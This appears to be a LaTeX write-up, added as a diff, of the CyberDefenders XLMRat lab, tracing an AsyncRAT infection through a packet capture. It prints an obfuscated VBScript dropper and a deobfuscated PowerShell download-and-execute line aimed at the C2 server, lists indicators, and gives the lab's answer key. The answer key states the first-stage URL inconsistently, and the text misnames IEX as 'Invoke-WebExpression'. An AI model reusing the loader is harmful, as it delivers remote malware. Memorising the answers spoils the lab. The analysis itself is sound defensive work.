@@ -1,0 +1,810 @@
+%%  
+%%  A write-up template made for LaTeX
+%%  
+%%  Author: @egrzeszczak
+%%  
+
+\documentclass[12pt]{article}
+
+%%  ========================================================================
+%%  Set paper geometry
+%%  ========================================================================
+
+\usepackage[a4paper, inner=1.5cm, outer=1.5cm, top=2cm, bottom=2cm]{geometry}
+
+%%  ========================================================================
+%%  Set font
+%%  ========================================================================
+
+\usepackage{fontspec}
+\setmainfont{Arimo}
+
+%%  ========================================================================
+%%  Set automatic indent to 0px
+%%  ========================================================================
+
+\setlength{\parindent}{0pt} 
+
+%%  ========================================================================
+%%  Use pictures
+%%  ========================================================================
+
+\usepackage{graphicx}
+
+%%  ========================================================================
+%%  Page layout
+%%  ========================================================================
+
+\usepackage{fancyhdr}
+\usepackage{lastpage}
+\pagestyle{fancy}
+\fancyhf{}
+
+\renewcommand{\headrulewidth}{0pt}
+\renewcommand{\footrulewidth}{0pt}
+
+%%  ========================================================================
+%%  TLP Settings (https://www.first.org/tlp/docs/tlp-a4.pdf)
+%%  ========================================================================
+
+\usepackage{xcolor}
+\definecolor{tlpclear}{RGB}{255, 255, 255}
+\definecolor{tlpgreen}{RGB}{51, 255, 0}
+\definecolor{tlpamber}{RGB}{255, 192, 0}
+\definecolor{tlpred}{RGB}{255, 43, 43}
+
+\fancyfoot[C]{Page \thepage \hspace{1pt} of \pageref{LastPage}}
+
+\newcommand{\TLP}{TLP:CLEAR}                                                                      % uncomment for TLP:CLEAR
+\fancyhead[R]{\footnotesize \colorbox{black}{\textcolor{tlpclear}{\textbf{\TLP}}}}                % uncomment for TLP:CLEAR
+\fancyfoot[R]{\footnotesize \colorbox{black}{\textcolor{tlpclear}{\textbf{\TLP}}}}                % uncomment for TLP:CLEAR
+
+% \newcommand{\TLP}{TLP:GREEN}                                                                    % uncomment for TLP:GREEN
+% \fancyhead[R]{\footnotesize \colorbox{black}{\textcolor{tlpgreen}{\textbf{\TLP}}}}              % uncomment for TLP:GREEN
+% \fancyfoot[R]{\footnotesize \colorbox{black}{\textcolor{tlpgreen}{\textbf{\TLP}}}}              % uncomment for TLP:GREEN
+
+% \newcommand{\TLP}{TLP:AMBER}                                                                    % uncomment for TLP:AMBER
+% \fancyhead[R]{\footnotesize \colorbox{black}{\textcolor{tlpamber}{\textbf{\TLP}}}}              % uncomment for TLP:AMBER
+% \fancyfoot[R]{\footnotesize \colorbox{black}{\textcolor{tlpamber}{\textbf{\TLP}}}}              % uncomment for TLP:AMBER
+
+% \newcommand{\TLP}{TLP:AMBER+STRICT}                                                             % uncomment for TLP:AMBER+STRICT
+% \fancyhead[R]{\footnotesize \colorbox{black}{\textcolor{tlpamber}{\textbf{\TLP}}}}              % uncomment for TLP:AMBER+STRICT
+% \fancyfoot[R]{\footnotesize \colorbox{black}{\textcolor{tlpamber}{\textbf{\TLP}}}}              % uncomment for TLP:AMBER+STRICT
+
+% \newcommand{\TLP}{TLP:RED}                                                                      % uncomment for TLP:RED
+% \fancyhead[R]{\footnotesize \colorbox{black}{\textcolor{tlpred}{\textbf{\TLP}}}}                % uncomment for TLP:RED
+% \fancyfoot[R]{\footnotesize \colorbox{black}{\textcolor{tlpred}{\textbf{\TLP}}}}                % uncomment for TLP:RED
+
+%%  ========================================================================
+%%  Timeline
+%%  ========================================================================
+
+\usepackage{environ}
+\usepackage{tikz}
+\usetikzlibrary{calc,matrix}
+
+%% Code by Claudio:
+%% https://tex.stackexchange.com/a/197447/221452
+%% Uses code by Andrew:
+%% http://tex.stackexchange.com/a/28452/13304
+\makeatletter
+    \let\matamp=&
+    \catcode`\&=13
+    \def&{%
+        \iftikz@is@matrix%
+            \pgfmatrixnextcell%
+        \else%
+            \matamp%
+        \fi%
+    }
+\makeatother
+
+\newcounter{lines}
+\def\endlr{\stepcounter{lines}\\}
+
+\newcounter{vtml}
+\setcounter{vtml}{0}
+
+\newif\ifvtimelinetitle
+\newif\ifvtimebottomline
+
+\tikzset{
+    description/.style={column 2/.append style={#1}},
+    timeline color/.store in=\vtmlcolor,
+    timeline color=red!80!black,
+    timeline color st/.style={fill=\vtmlcolor,draw=\vtmlcolor},
+    use timeline header/.is if=vtimelinetitle,
+    use timeline header=false,
+    add bottom line/.is if=vtimebottomline,
+    add bottom line=false,
+    timeline title/.store in=\vtimelinetitle,
+    timeline title={},
+    line offset/.store in=\lineoffset,
+    line offset=4pt,
+}
+
+\NewEnviron{vtimeline}[1][]{%
+    \setcounter{lines}{1}%
+    \stepcounter{vtml}%
+    \begin{tikzpicture}[column 1/.style={anchor=east},
+        column 2/.style={anchor=west},
+        text depth=0pt,text height=1ex,
+        row sep=1ex,
+        column sep=1em,
+        #1
+    ]
+        \matrix(vtimeline\thevtml)[matrix of nodes]{\BODY};
+        \pgfmathtruncatemacro\endmtx{\thelines-1}
+
+        \path[timeline color st]
+            ($(vtimeline\thevtml-1-1.north east)!0.5!(vtimeline\thevtml-1-2.north west)$)--
+            ($(vtimeline\thevtml-\endmtx-1.south east)!0.5!(vtimeline\thevtml-\endmtx-2.south west)$);
+
+        \foreach \x in {1,...,\endmtx}{
+            \node[circle,timeline color st, inner sep=0.15pt, draw=white, thick]
+            (vtimeline\thevtml-c-\x) at
+            ($(vtimeline\thevtml-\x-1.east)!0.5!(vtimeline\thevtml-\x-2.west)$){};
+                \draw[timeline color st](vtimeline\thevtml-c-\x.west)--++(-3pt,0);
+        }
+
+        \ifvtimelinetitle%
+            \draw[timeline color st]([yshift=\lineoffset]vtimeline\thevtml.north west)--
+                ([yshift=\lineoffset]vtimeline\thevtml.north east);
+
+            \node[anchor=west,yshift=16pt,font=\large]
+                at (vtimeline\thevtml-1-1.north west)
+                {\textsc{Timeline \thevtml}: \textit{\vtimelinetitle}};
+        \else%
+            \relax%
+        \fi%
+
+        \ifvtimebottomline%
+            \draw[timeline color st]([yshift=-\lineoffset]vtimeline\thevtml.south west)--
+            ([yshift=-\lineoffset]vtimeline\thevtml.south east);
+        \else%
+            \relax%
+        \fi%
+    \end{tikzpicture}
+}
+
+% Sample to use in the document
+% 
+% \begin{vtimeline}[description={text width=7cm},
+%     row sep=4ex,
+%     use timeline header,
+%     timeline title={The title}]
+%     1947 & AT and T Bell Labs develop the idea of cellular phones\endlr
+%     1968 & Xerox Palo Alto Research Centre envisage the `Dynabook'\endlr
+%     1971 & Busicom 'Handy-LE' Calculator\endlr
+%     1973 & First mobile handset invented by Martin Cooper\endlr
+%     1978 & Parker Bros. Merlin Computer Toy\endlr
+%     1981 & Osborne 1 Portable Computer\endlr
+%     1982 & Grid Compass 1100 Clamshell Laptop\endlr
+%     1983 & TRS-80 Model 100 Portable PC\endlr
+%     1984 & Psion Organiser Handheld Computer\endlr
+%     1991 & Psion Series 3 Minicomputer\endlr
+% \end{vtimeline}
+% or
+% \begin{vtimeline}[timeline color=black!80!gray, line offset=2pt]
+%     1947 & AT and T Bell Labs develop the idea of cellular phones\endlr
+%     1968 & Xerox Palo Alto Research Centre envisage the `Dynabook'\endlr
+%     1971 & Busicom 'Handy-LE' Calculator\endlr
+%     1973 & First mobile handset invented by Martin Cooper\endlr
+%     1978 & Parker Bros. Merlin Computer Toy\endlr
+%     1981 & Osborne 1 Portable Computer\endlr
+%     1982 & Grid Compass 1100 Clamshell Laptop\endlr
+%     1983 & TRS-80 Model 100 Portable PC\endlr
+%     1984 & Psion Organiser Handheld Computer\endlr
+%     1991 & Psion Series 3 Minicomputer\endlr
+% \end{vtimeline}
+
+%%  ========================================================================
+%%  Code highlight
+%%  ========================================================================
+
+\usepackage{listings}
+
+\newfontfamily{\codefont}{Input Mono}    % font for code snippets
+
+\definecolor{dkgreen}{rgb}{0,0.6,0}
+\definecolor{red}{rgb}{0.9,0.1,0.1}
+\definecolor{gray}{rgb}{0.5,0.5,0.5}
+\definecolor{mauve}{rgb}{0.58,0,0.82}
+
+\lstset{
+  frame=single,
+  framesep=0.25cm,
+  framexleftmargin=0cm,
+  framexrightmargin=0cm,
+  rulecolor=\color{lightgray},
+  backgroundcolor=\color{lightgray!20},
+  aboveskip=3mm,
+  belowskip=3mm,
+  showstringspaces=false,
+  columns=flexible,
+  basicstyle={\codefont\fontsize{9}{10}\selectfont},
+  numbers=none,
+  numberstyle=\tiny\color{red},
+  keywordstyle=\color{blue},
+  commentstyle=\color{dkgreen},
+  stringstyle=\color{mauve},
+  breaklines=true,
+  breakatwhitespace=true,
+  postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space},
+  tabsize=3,
+  framextopmargin=0pt,
+  framexbottommargin=0pt,
+}
+
+%%  ========================================================================
+%%  Questions
+%%  ========================================================================
+
+\usepackage{enumitem}
+
+\newlist{questions}{enumerate}{3}
+\setlist[questions]{itemindent=1cm, align=parleft,itemsep=0.25cm,parsep=\lineskip}
+\setlist[questions,1]{label=Q\,\arabic*,leftmargin=1.5\parindent,labelindent=0pt,ref=\arabic*}
+\setlist[questions,2]{label=Q\,\arabic{questionsi}.\arabic*,leftmargin=.5\parindent,labelindent=-1.5\parindent,ref=\arabic{questionsi}.\arabic*,topsep=\lineskip,partopsep=\lineskip}
+\setlist[questions,3]{label=Q\,\arabic{questionsi}.\arabic{questionsii}.\arabic*,leftmargin=.5\parindent,labelindent=-2\parindent,ref=\arabic{questionsi}.\arabic{questionsii}.\arabic*,topsep=\lineskip,partopsep=\lineskip}
+\newcommand*\qn{\stepcounter{cntquestions}\item\label{qn:\thecntquestions}}
+\newcommand*\ans{\item[A\,\ref{qn:\thecntquestions}]}
+\newcounter{cntquestions}
+
+%%  ========================================================================
+%%  Additional settings
+%%  ========================================================================
+
+% \usepackage{showframe}                  % shows the document framing
+\usepackage{blindtext}                  % generates placeholder text
+\usepackage{xcolor}                     % for additional coloring
+\usepackage{array}                      % for table styling
+\usepackage[hidelinks]{hyperref}        % links
+
+%%  ========================================================================
+%%  Document start
+%%  ========================================================================
+
+\begin{document}
+
+%%  ========================================================================
+%%  Title page
+%%  ========================================================================
+
+\begin{titlepage}
+
+    \thispagestyle{fancy} % Use fancy headers with TLP classifications
+
+    \fancyfoot[C]{} % Removes the page numering from the title page
+
+    \vspace*{\fill}
+
+    \begin{flushleft}
+
+        {\Large \textbf{XLMRat Lab}}
+
+        \vspace{0.5cm}
+        
+        {\large A write-up by \href{https://github.com/egrzeszczak}{@egrzeszczak}}
+
+        \vspace{0.5cm}
+
+        {Analyze network traffic to identify malware delivery, deobfuscate scripts, and map attacker techniques using MITRE ATT\&CK, focusing on stealthy execution and reflective code loading. A compromised machine has been flagged due to suspicious network traffic. Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise.}
+
+    \end{flushleft}
+
+    \vspace*{\fill}
+    
+\end{titlepage}
+
+%%  ========================================================================
+%%  Content start
+%%  ========================================================================
+
+%%      ====================================================================
+%%      Table of contents
+%%      ====================================================================
+
+\clearpage
+\tableofcontents
+\clearpage
+
+%%      ====================================================================
+%%      Introduction
+%%      ====================================================================
+
+\section{Introduction}
+
+CyberDefenders is a training platform for SOC analysts, threat hunters, security blue teams and DFIR professionals to advance their cyberdefence skills. The platform provides free as well as premium labs for anyone to solve. This writeup describes the \textbf{XLMRat Lab} created by @cyberdefenders, @malware\_traffic and @E\_O1 available for free on cyberdefenders.org.
+
+\vspace{0.5cm}
+
+In this network forensics scenario we are asked to analyze a PCAP file to determine the attack method, as well as to identify any malicious payloads that are present. Furthermore we need to trace the timeline of events, figure out how the attacker gained access, which tools and techniques were used and the how the malware operated.
+
+\vspace{0.5cm}
+
+You can try to solve the lab yourself. It is available under https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/.
+
+\clearpage
+
+%%      ====================================================================
+%%      Objectives
+%%      ====================================================================
+
+\section{Objectives}
+
+From the lab's description:
+
+\begin{quote}
+    \textit{Your task is to analyze the PCAP file to \textbf{determine the attack method}, \textbf{identify any malicious payloads}, and \textbf{trace the timeline of events}. Focus on \textbf{how the attacker gained access}, \textbf{what tools or techniques were used}, and \textbf{how the malware operated post-compromise}.}
+\end{quote}
+
+Additionally, I'm asked to provide answers for the following questions:
+
+\setcounter{cntquestions}{0}
+
+\begin{questions}
+    \qn \label{q:1} The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?
+    \qn \label{q:2} Which hosting provider owns the associated IP address?
+    \qn \label{q:3} By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?
+    \qn \label{q:4} What is the malware family label based on Alibaba?
+    \qn \label{q:5} What is the timestamp of the malware's creation?
+    \qn \label{q:6} Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.
+    \qn \label{q:7} The script is designed to drop several files. List the names of the files dropped by the script.
+\end{questions}
+
+\clearpage
+
+%%      ====================================================================
+%%      Preparation
+%%      ====================================================================
+
+\section{Preparation}
+
+\subsection{Tools}
+
+Getting familiar with the objectives I know straight away that we are going to be using Wireshark. I have prepared my Kali Linux environment with Wireshark installed by default. Almost always there is always some Threat Intelligence gathering done with these kinds of analysis. I'm using my favourites: VirusTotal and perhaps FileScan also will come in handy. For code browsing I always use Visual Studio Code.
+
+\subsection{Evidence}
+
+We are provided with an evidence ZIP file (which on CyberDefenders platform is always encrypted with a password "cyberdefender.org"). I'm downloading the file straight to my Kali Linux instance. After unpacking we are left with only one PCAP file: 236-XLMRat.pcap.
+
+\vspace{0.5cm}
+
+Best practice in working with evidence is to always note the hash values of the files provided, as well as creating a working copy (in this case we don't have to since we have the zip file - but it doesnt hurt to get used to always making a copy no matter what). I got the hash of the file via "sha256sum" Linux utility and created a working copy of the evidence.
+
+\vspace{0.5cm}
+
+\begin{center}
+{\renewcommand{\arraystretch}{1.7}
+\begin{tabular}{| c | c |}
+    \hline
+    SHA256 & File name \\
+    \hline
+    \small{9b02fbf39c598b22e89bafb3a706d88667f6b8868b9494f50a3cad59686df923} & 236-XLMRat.pcap \\
+    \hline
+\end{tabular}
+}
+\end{center}
+
+\clearpage
+
+%%      ====================================================================
+%%      Analysis
+%%      ====================================================================
+
+\section{Analysis}
+
+\subsection{Packet capture file analysis (236-XLMRat.pcap)}
+
+Let's open up the PCAP file and get to work.
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.75\textwidth]{1-wireshark-open.png}
+    \caption{Opening the PCAP file with Wireshark}
+    \label{fig:opening-file-with-wireshark}
+\end{figure}
+
+Before I do a deep dive on the frames themselves, I always like to look at the statistics of the file first. Statistics are available in the \textbf{Statistics} tab above. First we will look at the \textbf{Capture File Properties}, then \textbf{Resolved Addresses}, \textbf{Protocol Hierarchy} and \textbf{Endpoints} to get a good first look on the situation.
+
+\vspace{0.5cm}
+
+From the statistics we can somewhat build a timeframe of the incident. Figure 2 shows the time: the first packed arrived on 9th of January 2024 at 18:27:27 and the last arrived on the same day at 18:40:13, so the we get about 13 minutes of communication.
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.75\textwidth]{2-file-properties.png}
+    \caption{Properties of the PCAP file}
+    \label{fig:properties-of-the-pcap-file}
+\end{figure}
+
+We then procede to Protocol Hierarchy Statistics to understand what kind of traffic are we looking at. We get two frames of DNS, 4 frames of HTTP and the rest is TCP and TLS traffic. What I'm interested in next is who is talking to who? I can use the Endpoints Statistics for that.
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.75\textwidth]{3-protocol-stats.png}
+    \caption{Protocol statistics of the PCAP file}
+    \label{fig:protocol-statistics-of-the-pcap-file}
+\end{figure}
+
+\vspace{0.5cm}
+
+Right away I identified two actors:
+
+\begin{itemize}
+    \item \textbf{Actor A}: 10.1.9.101 (our endpoint)
+    \item and \textbf{Actor B}: 45.126.209.4 (a suspicious server on the Internet)
+\end{itemize}
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.75\textwidth]{9-wireshark-start.png}
+    \caption{First messages}
+    \label{fig:first-messages}
+\end{figure}
+
+Conversation between Actor A and Actor B begins with Actor A requesting a resource from Actor B under the URI: hxxp[://]45.126.209[.]4:222[/]xlm.txt\footnote{Answer to Q1}. Then another request comes in a second later for hxxp[://]45.126.209[.]4:222[/]mdm.jpg. Doing a quick check on this remote IPv4 address we can find out that the domain associated with this server is reliablesite[.]net\footnote{Answer to Q2}
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.5\textwidth]{11-server.png}
+    \caption{AbuseIPDB info on Actor B}
+    \label{fig:first-messages}
+\end{figure}
+
+\vspace{0.5cm}
+
+The Actor A makes a DNS request for madmrx[.]duckdns[.]org about 2 minutes later. The DNS server returns with a response:
+
+\begin{lstlisting}[language=Bash]
+madmrx.duckdns.org: type A, class IN, addr 45.126.209.4
+\end{lstlisting}
+
+That IP address is our Actor B. After resolving the domain name, Actor A establishes a TLSv1.0 session with Actor B over port tcp/8808, that seems to last till the end of the file. I can separate this case into 3 streams to investigate one by one:
+
+\begin{enumerate}
+    \item File "xlm.txt" being downloaded to Actor A from hxxp[://]45.126.209[.]4:222[/]xlm.txt
+    \item File "mdm.jpg" being downloaded to Actor A from hxxp[://]45.126.209[.]4:222[/]mdm.jpg
+    \item and a TLS session between Actor A and Actor B on port tcp/8808.
+\end{enumerate}
+
+\clearpage
+
+% Actor A downloads xlm.txt
+\subsection{Actor A downloads "xlm.txt"}
+
+Since this stream is NOT encrypted (HTTP not HTTPS), I can read the contents of the stream.
+
+By using \textbf{File} > \textbf{Export objects...} > \textbf{HTTP...}, we are able to download the files by pressing \textbf{Save All}.
+
+\vspace{0.5cm}
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.75\textwidth]{4-export-objects.png}
+    \caption{Exporting HTTP objects option}
+    \label{fig:exporting-http-objects}
+\end{figure}
+
+Let's investigate \textbf{xlm.txt}. Using "head", "tail" or "cat" Linux utils we can chech out the contents.
+
+\begin{lstlisting}[language=VBScript]
+$ head xlm.txt -n 15
+Dim LZeWX(88), OodjR, i
+
+' Define each part based on the provided order
+LZeWX(0) = "[B"
+LZeWX(1) = "YT"
+LZeWX(2) = "e["
+LZeWX(3) = "]]"
+LZeWX(4) = ";$"
+LZeWX(5) = "A1"
+LZeWX(6) = "23"
+LZeWX(7) = "='"
+LZeWX(8) = "Ie"
+LZeWX(9) = "X("
+LZeWX(10) = "Ne"
+LZeWX(11) = "W-"
+...
+[TRUNCATED]
+...
+' Combine the parts into one string
+OodjR = ""
+For i = 0 To 88 - 1
+    OodjR = OodjR & LZeWX(i)
+Next
+
+' Use the combinedParts in the shell execution
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & OodjR, 0, True
+Set objShell = Nothing
+\end{lstlisting}
+
+Looking at the syntax it seems to be a VBA script, that attempts to run slightly obfuscated PowerShell code, that has been split into an array variables called LZeWX. Quick edit in text editor left me with this logic listed below (indicators defanged for safety):
+
+\begin{lstlisting}
+[BYTe[]]; $A123='IeX(NeW-OBJeCT NeT.W';$B456='eBCLIeNT).DOWNLO';
+[BYTe[]]; $C789='VAN(''hxxp[://]45.126.209[.]4:222[/]mdm.jpg'')'
+    .RePLACe('VAN','ADSTRING');
+[BYTe[]]; IeX($A123+$B456+$C789)
+\end{lstlisting}
+
+Which in the end becomes (indicators defanged for safety):
+
+\begin{lstlisting}
+Invoke-WebExpression(New-Object Net.WebClient)
+    .DownloadString(''hxxp[://]45.126.209[.]4:222[/]mdm.jpg'')
+\end{lstlisting}
+
+Now I know that this code caused the second stream that made Actor A download the "mdm.jpg" file. Let's analyze that file.
+
+\clearpage
+
+% Actor A downloads mdm.jpg ==============================
+\subsection{Actor A downloads "mdm.jpg"}
+
+Figure 6 contains a preview of the file. This is not a JPG file, obviously. This is another PowerShell script, now containing a lot more information. Seems to be divided into different sections.
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=1\textwidth]{7-mdmjpg-conteonts.png}
+    \caption{mdm.jpg contents, where the first section is visible}
+    \label{fig:mdm-jpg-contents}
+\end{figure}
+
+\begin{enumerate}
+    \item First section that seems to be an another PowerShell script (dropped as "Conted.ps1"), that contains two large strings, \textbf{hexString\_bbb} and \textbf{hexString\_pe} that probably (judging by the 4D\_5A magic number) contain an executable in hex divided by underscores,
+    \item Second section that is a Shell script (dropped as "Conted.bat"),
+    \item Third section that looks like a Visual Basic script (dropped as "Conted.vbs"),
+    \item and last section containing PowerShell code that creates a task called "Update Edge" that will run the third section every 2 minutes.
+\end{enumerate}
+
+First \textbf{Conted.vbs} is run, then \textbf{Conted.bat} and lastly \textbf{Conted.ps1}\footnote{Answer to Q7}. Let's focus however on the first section as it is the most important. First we will try to convert the executables stored in hexString\_bbb and hexString\_pe to binary format. I'm going to use CyberChef to do this. The recipe for that is very simple in this case:
+
+\begin{enumerate}
+    \item Remove the underscores from the data
+    \item Use "From Hex" operation next
+\end{enumerate}
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=\textwidth]{8-first-binary-cyberchef.png}
+    \caption{Using CyberChef to get the first executable}
+    \label{fig:cyberchef-first-binary}
+\end{figure}
+
+And then we just download the files. We will do the exact same operation for the second string. I've saved them as hexString\_bbb.bin and hexString\_pe.bin. Both of their SHA256 hashes have been listed below\footnote{Answer to Q3}.
+
+\begin{lstlisting}
+$ file hexString_*
+hexString_bbb.bin: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
+hexString_pe.bin:  PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
+
+$ sha256sum hex*   
+1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798  hexString_bbb.bin
+2c6c4cd045537e2586eab73072d790af362e37e6d4112b1d01f15574491296b8  hexString_pe.bin
+\end{lstlisting}
+
+We will deal with those executables in a minute. Let's deobfuscate the PowerShell code from the first section. We don't need any tool for this, just a simple text editor. After renaming the variables to more readable ones and replacing some characters as per instructions we get left with this, much simpler, logic, presented in Figure 9. The second executable "pe" is being loaded into memory using the Load method from Reflection.Assembly. Then the code loads another method "Execute" from that executable and runs RegSvcs.exe\footnote{Answer to Q6} to run the first executable. RegSvcs.exe is a commonly abused Living-off-the-Land binary by the adversary. Without going into another deep dive that would require debugging that executable that has been registered, we will find out from the Internet what it does. The results from FileScan are displayed in Figure \ref{fig:filescan-results}.
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=\textwidth]{10-deobfuscated-1-sec.png}
+    \caption{Deobfuscated PowerShell code from first section of mdm.jpg}
+    \label{fig:first-section-deobfuscated}
+\end{figure}
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=\textwidth]{12-filescan.png}
+    \caption{Details for the first (main) executable on FileScan}
+    \label{fig:filescan-results}
+\end{figure}
+
+\vspace{0.5cm}
+
+Looks like we are dealing with AsyncRAT\footnote{Answer to Q4} executable. It's a Remote Access Tool (RAT) designed to remotely monitor and control other computers through a secure encrypted connection. The executable has been compiled on 30th of October at 15:08\footnote{Answer to Q5}.
+
+\clearpage
+
+% TLS session between Actor A and Actor B on port tcp/8808 ==============================
+\subsection{TLS session between Actor A and Actor B on port tcp/8808}
+
+The "madmrx.duckdns.org" DNS query returned the address 45.126.209.4, which is our Actor B. After the DNS query there is the third and last TCP stream, which is now encrypted using TLSv1.0. There is a Key Exchange between A and B, and B also sends a certificate. Let's take a look at this certificate. We will follow the third stream in Wireshark. For that to happen we need to find the specific TLS frame with \textbf{Server Hello} response that contains the content we are looking for.
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.75\textwidth]{5-export-certificate.png}
+    \caption{Exporting the certificate from the TLS stream}
+    \label{fig:exporting-certificate}
+\end{figure}
+
+\vspace{0.5cm}
+
+To export the certificate, I navigate to signedCertificate field in the panel below and select the \textbf{Export Packet Bytes...} option from the context menu. I'll save this certificate as exported\_cert.cer. Let's check it out.
+
+\begin{lstlisting}[language=Bash]
+# Display full information about the certificate
+$ openssl x509 -in exported_cert.cer -info
+    
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            f7:96:43:86:09:dc:cb:d1:78:21:b0:2f:39:fb:ad
+        Signature Algorithm: sha512WithRSAEncryption
+        Issuer: CN=AsyncRAT Server
+        Validity
+            Not Before: Apr 25 00:41:09 2022 GMT
+            Not After : Dec 31 23:59:59 9999 GMT
+        Subject: CN=AsyncRAT Server
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (4096 bit)
+                Modulus:
+                    00:a4:fd:9d:86:13:8d:84:d9:85:8f:a0:d6:d7:a4:
+                    67:cf:c5:db:d8:2c:10:80:e0:7f:ff:28:76:f0:9b:
+                    0a:66:0a:18:66:59:8b:6c:8d:0f:d3:63:b4:15:c4:
+                    30:03:4c:f4:f0:17:0b:23:1a:a4:6b:da:a4:33:db:
+                    5a:08:d8:90:b8:8c:c3:f5:70:6b:79:19:46:0e:e4:
+                    ...
+    
+\end{lstlisting}
+
+The certificate issuer has the common name "AsyncRAT Server". Since this certificate has been used for encrypted C2 communication, we'll add it to our incidcator list. It is common practice to note the cert's fingerprint.
+
+\begin{lstlisting}[language=Bash]
+# Output the SHA1 fingerprint
+$ openssl x509 -in exported_cert.cer -fingerprint -noout
+SHA1 Fingerprint=C0:74:2F:CF:AC:08:26:95:4D:1F:B6:6F:1E:AB:22:B3:91:B1:75:90
+\end{lstlisting}
+% \begin{figure}[h]
+%     \centering
+%     \includegraphics[width=0.75\textwidth]{6-certificate.png}
+%     \caption{TLS Certificate presented by B}
+%     \label{fig:tls-certificate}
+% \end{figure}
+
+
+
+%%      ====================================================================
+%%      Post
+%%      ====================================================================
+
+\clearpage
+\section{Post}
+
+\subsection{Summary}
+
+This has been a case of an endpoint infected with an AsyncRAT. We can't tell what was the entry point for this malicious chain of events. The endpoint (here referenced as Actor A) has invoked a series of HTTP GET requests, which finally lead to the malicious payload (the AsyncRAT) being executed via RegSvcs.exe, a common Windows Living-Off-The-Land binary. Then a stream of encrypted communication took place, most likely to deliver commands to the infected system. 
+
+\subsection{Answers}
+
+\setcounter{cntquestions}{0}
+
+\begin{questions}
+    \qn \label{a:1} The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?
+    \ans (DEFANGED FOR SAFETY) hxxp[://]45.126.209[.]4:222/mdm.jpg
+    \qn \label{a:2} Which hosting provider owns the associated IP address?
+    \ans (DEFANGED FOR SAFETY) reliablesite[.]net
+    \qn \label{a:3} By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?
+    \ans 1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798
+    \qn \label{a:4} What is the malware family label based on Alibaba?
+    \ans AsyncRAT
+    \qn \label{a:5} What is the timestamp of the malware's creation?
+    \ans 2023-10-30 15:08
+    \qn \label{a:6} Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.
+    \ans C:{\textbackslash}Windows{\textbackslash}Microsoft.NET{\textbackslash}Framework{\textbackslash}v4.0.30319{\textbackslash}RegSvcs.exe
+    \qn \label{a:7} The script is designed to drop several files. List the names of the files dropped by the script.
+    \ans Conted.vbs, Conted.ps1, Conted.bat
+\end{questions}
+\clearpage
+
+\subsection{Timeline of events}
+
+Time for the event is provided in UTC.
+
+\vspace{0.5cm}
+
+\textbf{2024-01-09:}
+
+\vspace{0.5cm}
+
+\begin{vtimeline}[timeline color=black!80!gray, row sep=4ex, description={text width=14cm}]
+        17:27:27.871 & Victim downloads "xlm.txt" from the malicious server 45.126.209[.]4 via HTTP over port 222/tcp\endlr
+        17:27:29.161 & Victim downloads another file, "mdm.jpg" from the malicious server 45.126.209[.]4 via HTTP over port 222/tcp\endlr
+        17:29:48.927 & Victim queries DNS for madmrx[.]duckdns[.]org\endlr
+        17:29:49.582 & Victim makes a TLS handshake with C2 server over 8808/tcp\endlr
+    \end{vtimeline}
+
+\subsection{Indicators of Compromise}
+
+\subsubsection{Files}
+
+\begin{center}
+{\renewcommand{\arraystretch}{1.7}
+\begin{tabular}{| c | c |}
+    \hline
+    SHA256 & File name \\
+    \hline
+    \small{1e9c29d7af6011ca9d5609cb93b554965c61105a42df9fe0c36274e60db71b1d} & xlm.txt \\
+    \hline
+    \small{83babee77db36512c0eab8ea6b35e981aa4288a4095985d69b3841f8b684fe11} & mdm.jpg \\
+    \hline
+    \small{1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798} & hexString\_bbb.bin \\
+    \hline
+    \small{2c6c4cd045537e2586eab73072d790af362e37e6d4112b1d01f15574491296b8} & hexString\_pe.bin \\
+    \hline
+    \small{136fbfd2d255a7fc69c16fe115138d7a53ed0a7db8302017ee0e692b42d82ffe} & exported\_cert.cer \\
+    \hline
+\end{tabular}
+}
+\end{center}
+
+\subsubsection{IPv4s}
+
+\begin{center}
+{\renewcommand{\arraystretch}{1.7}
+\begin{tabular}{| c | c |}
+    \hline
+    IPv4 & Name \\
+    \hline
+    \small{45.126.209.4} & AsyncRAT Server \\
+    \hline
+\end{tabular}
+}
+\end{center}
+
+\subsubsection{Domains}
+
+\begin{center}
+{\renewcommand{\arraystretch}{1.7}
+\begin{tabular}{| c | c |}
+    \hline
+    Domain & Description \\
+    \hline
+    \small{madmrx.duckdns.org} & AsyncRAT C2C Domain \\
+    \hline
+\end{tabular}
+}
+\end{center}
+
+\subsubsection{Certficates}
+
+\begin{center}
+{\renewcommand{\arraystretch}{1.7}
+\begin{tabular}{| c | c |}
+    \hline
+    SHA1 Fingerprint & Common name \\
+    \hline
+    \small{c0742fcfac0826954d1fb66f1eab22b391b17590} & AsyncRAT Server \\
+    \hline
+\end{tabular}
+}
+\end{center}
+
